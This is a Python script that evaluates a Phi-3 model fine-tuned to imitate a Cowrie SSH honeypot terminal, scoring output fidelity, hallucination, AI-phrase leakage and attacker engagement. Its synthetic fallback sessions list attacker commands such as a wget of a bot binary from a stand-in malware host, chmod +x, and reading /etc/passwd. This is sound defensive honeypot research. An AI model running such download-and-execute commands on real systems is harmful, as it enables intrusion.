import json
import random
import re
import warnings
from pathlib import Path

import torch
from bert_score import score as bert_score_fn
from peft import PeftModel
from transformers import AutoModelForCausalLM, AutoTokenizer, BitsAndBytesConfig

warnings.filterwarnings("ignore", category=UserWarning)

BASE_DIR     = Path(__file__).resolve().parent
MODEL_NAME   = "microsoft/Phi-3-mini-4k-instruct"
ADAPTER_PATH = str(BASE_DIR / "phi3-cowrie-lora-adapter")
DATASET_PATH = str(BASE_DIR / "combined_finetune_dataset.jsonl")
CSV_PATH     = str(BASE_DIR.parent / "Processed_Data.csv")
OUTPUT_JSON  = str(BASE_DIR / "llm_evaluation_results.json")

#   F1 >= 0.75          → Consistent   
#   0.45 <= F1 < 0.75   → Inconsistent 
#   F1 < 0.45           → Hallucination 

HALLUCINATION_THRESHOLD = 0.45   # semantic floor
CONSISTENCY_THRESHOLD   = 0.75   # (Zhang et al. 2020)

ENGAGEMENT_FACTORS = [0.10, 0.15, 0.20, 0.25, 0.30] # for find best engagement factor

AEI_SESSION_SAMPLE = 999_999   # use all available Cowrie sessions
SEED               = 42
MAX_NEW_TOKENS     = 128
TEMPERATURE        = 0.1
DO_SAMPLE          = True

# AI-leakage regex
LEAKAGE_PATTERNS = [
    r"I (cannot|can't|am unable|will not|won't)",
    r"As an (AI|language model|assistant)",
    r"I don'?t have (access|the ability)",
    r"I'?m sorry",
    r"\bNote:\b",
    r"\bPlease note\b",
    r"I am designed to",
    r"my (training|knowledge cutoff)",
    r"I should (mention|clarify|point out)",
]
_LEAKAGE_RE = re.compile("|".join(LEAKAGE_PATTERNS), re.IGNORECASE)

_SYS  = "\x3c|system|\x3e"
_USR  = "\x3c|user|\x3e"
_ASST = "\x3c|assistant|\x3e"
_END  = "\x3c|end|\x3e"

SYSTEM_PROMPT = (
    "You are a Linux terminal emulator (Cowrie SSH honeypot). "
    "Respond ONLY with the exact terminal output that the given command "
    "would produce on a Debian-based system. Do not add explanations."
)

_BERT_DEVICE: str = "cpu"

def build_prompt(instruction: str) -> str:
    return (
        f"{_SYS}\n{SYSTEM_PROMPT}{_END}\n"
        f"{_USR}\n{instruction}{_END}\n"
        f"{_ASST}\n"
    )


def clean_output(raw: str, prompt: str) -> str:
    text = raw[len(prompt):] if raw.startswith(prompt) else raw
    for tok in [_END, _ASST, _USR, _SYS, "\x3c/s\x3e", "\x3cs\x3e"]:
        text = text.replace(tok, "")
    return text.strip()


def load_jsonl(path: str) -> list:
    rows = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                rows.append(json.loads(line))
    return rows


@torch.no_grad()
def generate_response(model, tokenizer, prompt: str, device: str) -> str:
    inputs  = tokenizer(prompt, return_tensors="pt").to(device)
    outputs = model.generate(
        **inputs,
        max_new_tokens=MAX_NEW_TOKENS,
        temperature=TEMPERATURE,
        do_sample=DO_SAMPLE,
        pad_token_id=tokenizer.eos_token_id,
    )
    decoded = tokenizer.decode(outputs[0], skip_special_tokens=False)
    return clean_output(decoded, prompt)


def has_leakage(text: str) -> bool:
    return bool(_LEAKAGE_RE.search(text))


def bertscore_f1_single(hyp: str, ref: str) -> float:
    _, _, F1 = bert_score_fn(
        [hyp], [ref], lang="en", verbose=False,
        device=_BERT_DEVICE, rescale_with_baseline=False,
    )
    return F1.item()


def hline(char="=", width=80): print(char * width)

def section(title: str): print(); hline(); print(f"  {title}"); hline()

def kv(key: str, val, indent=2):
    print(" " * indent + f"{key:<48s} {val}")


def compute_bertscore(references: list, hypotheses: list) -> dict:
    P, R, F1 = bert_score_fn(
        hypotheses, references, lang="en",
        verbose=False, device=_BERT_DEVICE,
    )
    return {
        "precision":     P.mean().item(),
        "recall":        R.mean().item(),
        "f1":            F1.mean().item(),
        "per_sample_f1": F1.tolist(),
    }


def bertscore_subset(per_sample_f1: list, indices: list) -> dict:
    if not indices:
        return {"f1": 0.0, "n": 0}
    vals = [per_sample_f1[i] for i in indices]
    return {"f1": round(sum(vals) / len(vals), 4), "n": len(vals)}


def load_cowrie_sessions(csv_path: str, max_sessions: int = 999_999) -> list:
    try:
        import pandas as pd
    except ImportError:
        print("  [WARN] pandas not available — using fallback sessions.")
        return _fallback_sessions(50)
    try:
        df = pd.read_csv(
            csv_path,
            usecols=["source_cowrie", "event_type", "session_id",
                     "session_duration", "request_data"],
            low_memory=False,
        )
    except Exception as e:
        print(f"  [WARN] Cannot read CSV ({e}) — using fallback sessions.")
        return _fallback_sessions(50)

    cowrie   = df[df["source_cowrie"] == 1].copy()
    cmd_mask = cowrie["event_type"].str.contains("command", case=False, na=False)
    cmd_rows = cowrie[cmd_mask].dropna(subset=["request_data", "session_id"])

    sessions = []
    for sid, group in cmd_rows.groupby("session_id"):
        cmds     = group["request_data"].tolist()
        duration = group["session_duration"].iloc[0]
        if len(cmds) >= 1 and duration > 0:
            sessions.append({
                "session_id": str(sid),
                "cmd_count":  len(cmds),
                "duration":   float(duration),
                "commands":   [str(c).strip() for c in cmds[:10]],
            })

    if not sessions:
        return _fallback_sessions(50)

    random.shuffle(sessions)
    return sessions[:max_sessions]


def _fallback_sessions(n: int) -> list:
    cmds = [
        "uname -a", "cat /etc/passwd", "whoami", "id", "w",
        "ls -la /", "ps -ef", "ifconfig", "cat /proc/cpuinfo",
        "wget http://malware.example.com/bot", "chmod +x bot",
        "hostname", "df -h", "free -m", "netstat -tulpn",
    ]
    sessions = []
    for i in range(n):
        k = random.randint(1, 8)
        sessions.append({
            "session_id": f"synthetic_{i:04d}",
            "cmd_count":  k,
            "duration":   random.uniform(0.5, 15.0),
            "commands":   random.sample(cmds, min(k, len(cmds))),
        })
    return sessions


def _aei_aggregate(session_results: list, factor: float) -> dict:
    if not session_results:
        return {"session_count": 0, "aei_mean": 0.0, "aei_median": 0.0,
                "engagement_factor": factor}

    aei_v  = [s["aei"]               for s in session_results]
    qual_v = [s["avg_quality_score"] for s in session_results]
    dcmd_v = [s["delta_commands"]    for s in session_results]
    ddur_v = [s["delta_duration"]    for s in session_results]
    n      = len(aei_v)

    s_aei = sorted(aei_v)
    med   = s_aei[n//2] if n % 2 else (s_aei[n//2-1] + s_aei[n//2]) / 2

    tc = sum(s["cowrie_cmd_count"] for s in session_results)
    tl = sum(s["llm_cmd_count"]   for s in session_results)
    td = sum(s["cowrie_duration"]  for s in session_results)
    ld = sum(s["llm_duration"]     for s in session_results)

    return {
        "engagement_factor":         factor,
        "session_count":             n,
        "aei_mean":                  round(sum(aei_v) / n,   4),
        "aei_median":                round(med,               4),
        "aei_min":                   round(min(aei_v),        4),
        "aei_max":                   round(max(aei_v),        4),
        "avg_quality_score":         round(sum(qual_v) / n,   4),
        "avg_delta_commands":        round(sum(dcmd_v) / n,   2),
        "avg_delta_duration":        round(sum(ddur_v) / n,   3),
        "total_cowrie_commands":     tc,
        "total_llm_commands":        round(tl, 2),
        "total_cowrie_duration_sec": round(td, 2),
        "total_llm_duration_sec":    round(ld, 2),
        "command_increase_pct":      round((tl - tc) / max(tc, 1)    * 100, 2),
        "duration_increase_pct":     round((ld - td) / max(td, 0.01) * 100, 2),
    }


def compute_aei_sensitivity(
    model, tokenizer, device: str,
    gt_data: list,
    cowrie_sessions: list,
    engagement_factors: list,
    hallucinated_session_ids: set,
) -> tuple:
    cmd_lookup = {
        e["instruction"].strip(): e["output"].strip()
        for e in gt_data if e.get("instruction") and e.get("output")
    }

    print(f"\n  Simulating {len(cowrie_sessions)} sessions (single pass)...")
    per_session_base = []
    total = len(cowrie_sessions)

    for idx, session in enumerate(cowrie_sessions, 1):
        cowrie_cmd_count = session["cmd_count"]
        cowrie_duration  = session["duration"]

        quality_scores = []
        for cmd in session["commands"]:
            ref = cmd_lookup.get(cmd)
            if ref is None:
                continue
            llm_resp = generate_response(
                model, tokenizer, build_prompt(cmd), device)
            if llm_resp and ref:
                quality_scores.append(bertscore_f1_single(llm_resp, ref))

        if not quality_scores:
            continue

        avg_quality  = sum(quality_scores) / len(quality_scores)
        avg_interval = cowrie_duration / cowrie_cmd_count if cowrie_cmd_count else 1.0

        per_session_base.append({
            "session_id":       session["session_id"],
            "cowrie_cmd_count": cowrie_cmd_count,
            "cowrie_duration":  cowrie_duration,
            "avg_quality":      avg_quality,
            "avg_interval":     avg_interval,
            "is_hallucinated":  session["session_id"] in hallucinated_session_ids,
        })

        if idx % 10 == 0 or idx == total:
            print(f"  [{idx:>4}/{total}] sessions processed...", end="\r")
    print()

    sensitivity = {}
    aei_subsets = {}

    for factor in engagement_factors:
        all_r  = []
        hall_r = []
        clean_r= []

        for s in per_session_base:
            llm_cmd = s["cowrie_cmd_count"] * (1 + s["avg_quality"] * factor)
            llm_dur = llm_cmd * s["avg_interval"]
            d_cmd   = llm_cmd - s["cowrie_cmd_count"]
            d_dur   = llm_dur - s["cowrie_duration"]
            aei     = (d_cmd / d_dur) if abs(d_dur) > 1e-6 else 0.0

            row = {
                "session_id":        s["session_id"],
                "cowrie_cmd_count":  s["cowrie_cmd_count"],
                "cowrie_duration":   round(s["cowrie_duration"], 3),
                "llm_cmd_count":     round(llm_cmd, 2),
                "llm_duration":      round(llm_dur, 3),
                "avg_quality_score": round(s["avg_quality"], 4),
                "delta_commands":    round(d_cmd, 2),
                "delta_duration":    round(d_dur, 3),
                "aei":               round(aei, 4),
            }
            all_r.append(row)
            (hall_r if s["is_hallucinated"] else clean_r).append(row)

        fk = str(factor)
        sensitivity[fk] = _aei_aggregate(all_r,   factor)
        aei_subsets[fk] = {
            "with_hallucination":    _aei_aggregate(hall_r,  factor),
            "without_hallucination": _aei_aggregate(clean_r, factor),
        }

    return sensitivity, aei_subsets


def compute_consistency(per_sample_f1: list, threshold: float) -> dict:
    consistent = sum(1 for f in per_sample_f1 if f >= threshold)
    n          = len(per_sample_f1)
    return {
        "threshold":            threshold,
        "consistent_samples":   consistent,
        "inconsistent_samples": n - consistent,
        "total_samples":        n,
        "consistency_rate_pct": round(consistent / n * 100, 2) if n else 0.0,
    }


def consistency_subset(per_sample_f1: list, indices: list,
                        threshold: float, label: str) -> dict:
    vals       = [per_sample_f1[i] for i in indices]
    consistent = sum(1 for f in vals if f >= threshold)
    n          = len(vals)
    return {
        "label":                label,
        "total_samples":        n,
        "consistent_samples":   consistent,
        "consistency_rate_pct": round(consistent / n * 100, 2) if n else 0.0,
    }


def compute_hallucination(
    hypotheses: list,
    per_sample_f1: list,
    bert_threshold: float,
) -> dict:
    sem_fail  = [i for i, f in enumerate(per_sample_f1) if f < bert_threshold]
    leak_fail = [i for i, h in enumerate(hypotheses)    if has_leakage(h)]
    hall_idx  = sorted(set(sem_fail) | set(leak_fail))
    clean_idx = [i for i in range(len(hypotheses)) if i not in set(hall_idx)]

    n = len(hypotheses)
    return {
        "bert_threshold":             bert_threshold,
        "total_samples":              n,
        "semantic_failures":          len(sem_fail),
        "leakage_failures":           len(leak_fail),
        "hallucinated_count":         len(hall_idx),
        "clean_count":                len(clean_idx),
        "hallucination_rate_pct":     round(len(hall_idx) / n * 100, 2) if n else 0.0,
        "semantic_hallucination_pct": round(len(sem_fail)  / n * 100, 2) if n else 0.0,
        "leakage_hallucination_pct":  round(len(leak_fail) / n * 100, 2) if n else 0.0,
        "hallucinated_indices":       hall_idx,
        "clean_indices":              clean_idx,
    }


def main():
    global _BERT_DEVICE
    random.seed(SEED)
    device       = "cuda" if torch.cuda.is_available() else "cpu"
    _BERT_DEVICE = device

    section("1 / 5  Loading Model (4-bit quantised)")

    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_compute_dtype=torch.float16,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_use_double_quant=True,
    )

    print("  Loading base model...")
    base_model = AutoModelForCausalLM.from_pretrained(
        MODEL_NAME, quantization_config=bnb_config,
        device_map={"": 0}, trust_remote_code=False,
        attn_implementation="eager",
    )

    print("  Loading tokenizer...")
    tokenizer = AutoTokenizer.from_pretrained(MODEL_NAME, trust_remote_code=False)
    if tokenizer.pad_token is None:
        tokenizer.pad_token = tokenizer.eos_token

    print("  Applying LoRA adapter...")
    model = PeftModel.from_pretrained(base_model, ADAPTER_PATH)
    model.eval()

    section("2 / 5  Generating Responses (full dataset)")

    gt_data      = load_jsonl(DATASET_PATH)
    gt_samples   = gt_data
    print(f"  Dataset size: {len(gt_samples)} entries")

    references   = []
    hypotheses   = []
    instructions = []

    for i, sample in enumerate(gt_samples, 1):
        instr     = sample["instruction"]
        expected  = sample["output"].strip()
        generated = generate_response(
            model, tokenizer, build_prompt(instr), device)

        references.append(expected)
        hypotheses.append(generated)
        instructions.append(instr)

        if i % 10 == 0 or i == len(gt_samples):
            print(f"  [{i:>3}/{len(gt_samples)}] $ {instr[:65]}", end="\r")

    print()
    print("\n  Computing BERTScore...")
    bert_results = compute_bertscore(references, hypotheses)
    per_f1       = bert_results["per_sample_f1"]

    section("3 / 5  Hallucination Classification")

    hall_results = compute_hallucination(hypotheses, per_f1, HALLUCINATION_THRESHOLD)
    hall_idx     = hall_results["hallucinated_indices"]
    clean_idx    = hall_results["clean_indices"]

    print(f"  Threshold (BERTScore F1 <)   : {HALLUCINATION_THRESHOLD}")
    print(f"  Hallucinated samples          : "
          f"{hall_results['hallucinated_count']} / {len(gt_samples)}"
          f"  ({hall_results['hallucination_rate_pct']:.1f}%)")
    print(f"  Clean samples                 : {hall_results['clean_count']}")
    print(f"    └─ Semantic failures         : {hall_results['semantic_failures']}"
          f"  ({hall_results['semantic_hallucination_pct']:.1f}%)")
    print(f"    └─ Leakage failures          : {hall_results['leakage_failures']}"
          f"  ({hall_results['leakage_hallucination_pct']:.1f}%)")

    bert_hall  = bertscore_subset(per_f1, hall_idx)
    bert_clean = bertscore_subset(per_f1, clean_idx)

    consist_overall = compute_consistency(per_f1, CONSISTENCY_THRESHOLD)
    consist_hall    = consistency_subset(
        per_f1, hall_idx,  CONSISTENCY_THRESHOLD, "with hallucination")
    consist_clean   = consistency_subset(
        per_f1, clean_idx, CONSISTENCY_THRESHOLD, "without hallucination")

    section("4 / 5  AEI Sensitivity Analysis")

    print(f"  Loading Cowrie sessions from: {CSV_PATH}")
    cowrie_sessions = load_cowrie_sessions(CSV_PATH, max_sessions=AEI_SESSION_SAMPLE)
    print(f"  Loaded {len(cowrie_sessions)} sessions.")
    print(f"  Engagement factors: {ENGAGEMENT_FACTORS}")

    # Tag sessions whose commands overlap with hallucinated instructions
    hall_cmds = {instructions[i] for i in hall_idx}
    hall_session_ids = {
        s["session_id"]
        for s in cowrie_sessions
        if any(cmd in hall_cmds for cmd in s["commands"])
    }

    aei_sensitivity, aei_subsets = compute_aei_sensitivity(
        model, tokenizer, device,
        gt_data, cowrie_sessions,
        ENGAGEMENT_FACTORS,
        hallucinated_session_ids=hall_session_ids,
    )

    section("5 / 5  EVALUATION REPORT")

    print("\n  A. BERTScore (Semantic Similarity)")
    print("  " + "-" * 76)
    kv("Samples evaluated",               f"{len(gt_samples)}")
    kv("Precision  (overall)",            f"{bert_results['precision']:.4f}")
    kv("Recall     (overall)",            f"{bert_results['recall']:.4f}")
    kv("F1         (overall)",            f"{bert_results['f1']:.4f}")
    kv("F1         (without hallucination)",
       f"{bert_clean['f1']:.4f}  (n={bert_clean['n']})")
    kv("F1         (with    hallucination)",
       f"{bert_hall['f1']:.4f}  (n={bert_hall['n']})")

    print("\n  B. Attacker Engagement Index — Sensitivity Analysis")
    print("  " + "-" * 76)
    print(f"  {'Factor':<8} {'Sessions':>9} {'AEI Mean':>10} {'AEI Median':>11}"
          f" {'Cmd +%':>8} {'Dur +%':>8}")
    print("  " + "-" * 58)
    for fk, res in aei_sensitivity.items():
        print(f"  {float(fk):<8.2f}"
              f" {res['session_count']:>9}"
              f" {res['aei_mean']:>10.4f}"
              f" {res['aei_median']:>11.4f}"
              f" {res['command_increase_pct']:>7.2f}%"
              f" {res['duration_increase_pct']:>7.2f}%")

    fk_ref  = "0.2" if "0.2" in aei_subsets else "0.20"
    sub     = aei_subsets.get(fk_ref, {})
    w_hall  = sub.get("with_hallucination",    {})
    wo_hall = sub.get("without_hallucination", {})
    print(f"\n  AEI subset split (factor = 0.20):")
    kv("AEI mean  (without hallucination)",
       f"{wo_hall.get('aei_mean', 'N/A')}  "
       f"(n={wo_hall.get('session_count', 0)} sessions)")
    kv("AEI mean  (with    hallucination)",
       f"{w_hall.get('aei_mean', 'N/A')}  "
       f"(n={w_hall.get('session_count', 0)} sessions)")

    print("\n  C. Consistency (Fidelity to Expected Cowrie Output)")
    print("  " + "-" * 76)
    kv("Fidelity threshold (BERTScore F1 >=)", f"{CONSISTENCY_THRESHOLD}")
    kv("Overall",
       f"{consist_overall['consistency_rate_pct']:.1f}%"
       f"  ({consist_overall['consistent_samples']} / {consist_overall['total_samples']})")
    kv("Without hallucination",
       f"{consist_clean['consistency_rate_pct']:.1f}%"
       f"  ({consist_clean['consistent_samples']} / {consist_clean['total_samples']})")
    kv("With    hallucination",
       f"{consist_hall['consistency_rate_pct']:.1f}%"
       f"  ({consist_hall['consistent_samples']} / {consist_hall['total_samples']})")

    print("\n  D. Hallucination Rate")
    print("  " + "-" * 76)
    kv("BERTScore F1 threshold",           f"< {HALLUCINATION_THRESHOLD}")
    kv("Total samples",                    f"{hall_results['total_samples']}")
    kv("Hallucinated",
       f"{hall_results['hallucinated_count']}"
       f"  ({hall_results['hallucination_rate_pct']:.1f}%)")
    kv("Clean",
       f"{hall_results['clean_count']}"
       f"  ({100 - hall_results['hallucination_rate_pct']:.1f}%)")
    kv("  └─ Semantic failures (F1 < threshold)",
       f"{hall_results['semantic_failures']}"
       f"  ({hall_results['semantic_hallucination_pct']:.1f}%)")
    kv("  └─ Leakage failures  (AI phrases detected)",
       f"{hall_results['leakage_failures']}"
       f"  ({hall_results['leakage_hallucination_pct']:.1f}%)")

    print("\n  E. Summary")
    print("  " + "-" * 76)
    fk020  = "0.2" if "0.2" in aei_sensitivity else "0.20"
    aei020 = aei_sensitivity.get(fk020, {}).get("aei_mean", "N/A")
    kv("BERTScore F1 (overall)",           f"{bert_results['f1']:.4f}")
    kv("BERTScore F1 (without halluc.)",   f"{bert_clean['f1']:.4f}")
    kv("BERTScore F1 (with    halluc.)",   f"{bert_hall['f1']:.4f}")
    kv("AEI Mean     (factor=0.20, all)",  f"{aei020}")
    kv("AEI Mean     (without halluc.)",
       f"{wo_hall.get('aei_mean', 'N/A')}")
    kv("AEI Mean     (with    halluc.)",
       f"{w_hall.get('aei_mean',  'N/A')}")
    kv("Consistency  (overall)",           f"{consist_overall['consistency_rate_pct']:.1f}%")
    kv("Consistency  (without halluc.)",   f"{consist_clean['consistency_rate_pct']:.1f}%")
    kv("Consistency  (with    halluc.)",   f"{consist_hall['consistency_rate_pct']:.1f}%")
    kv("Hallucination Rate",               f"{hall_results['hallucination_rate_pct']:.1f}%")

    output_data = {
        "bertscore": {
            "overall": {
                "precision": round(bert_results["precision"], 4),
                "recall":    round(bert_results["recall"],    4),
                "f1":        round(bert_results["f1"],        4),
                "n":         len(gt_samples),
            },
            "without_hallucination": bert_clean,
            "with_hallucination":    bert_hall,
            "per_sample_f1":         [round(x, 4) for x in per_f1],
        },
        "aei_sensitivity": aei_sensitivity,
        "aei_subsets":     aei_subsets,
        "consistency": {
            "overall":               consist_overall,
            "without_hallucination": consist_clean,
            "with_hallucination":    consist_hall,
        },
        "hallucination": {
            k: v for k, v in hall_results.items()
            if k not in ("hallucinated_indices", "clean_indices")
        },
        "config": {
            "model":                   MODEL_NAME,
            "adapter":                 ADAPTER_PATH,
            "ground_truth_samples":    len(gt_samples),
            "aei_session_count":       len(cowrie_sessions),
            "engagement_factors":      ENGAGEMENT_FACTORS,
            "hallucination_threshold": HALLUCINATION_THRESHOLD,
            "consistency_threshold":   CONSISTENCY_THRESHOLD,
            "max_new_tokens":          MAX_NEW_TOKENS,
            "temperature":             TEMPERATURE,
            "seed":                    SEED,
        },
    }

    with open(OUTPUT_JSON, "w", encoding="utf-8") as f:
        json.dump(output_data, f, indent=2, ensure_ascii=False)

    print(f"\n  Results saved to: {OUTPUT_JSON}")
    hline()
    print("  Evaluation complete.")
    hline()
    print()


if __name__ == "__main__":
    main()